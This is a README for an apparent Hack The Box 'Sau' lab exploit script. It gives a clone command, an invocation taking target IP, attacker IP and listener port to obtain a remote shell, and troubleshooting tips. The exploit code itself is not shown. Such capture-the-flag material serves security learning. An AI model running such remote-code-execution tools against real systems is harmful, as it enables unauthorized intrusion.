# SAU Machine Hackthebox

## Remote Code Execution (RCE)

Simple sau machine RCE to gain a shell.

---

### HOW TO USE IT

Download the `repository` :

```bash
git clone https://github.com/mikelgoti/SAU-HTB-RCE.git
```

Or just download the `sau_rce.py` .



Travel to the directory where you download the `script` and execute it with python:

```bash
python sau_rce.py -u <sau_machine_ip> -y <your_ip> -p <port_for_listener>
```

## EXAMPLES


![example1](images\example1.png)



![example2](images\example2.png)


---

## Not working ?

If the script is not running properly, it could be because you haven't installed one of these modules for Python:

+ import string

+ import random

+ import requests

+ import os

+ import threading

+ import time

+ import argparse

Install the missing modules with pip in your python enviroment and try it again.



Another reason could be that it's taking too much time to make the request, so you would need to increase this parameter to `10`.

![example3](images\example3.png)



Lastly, ensure that no other program on your computer is using port 8003, as this port needs to be available for python server.



---

## Note

`Don't worry about the 'Terminated' word showing once you've got the shell. It's because the Python server thread was closed.`
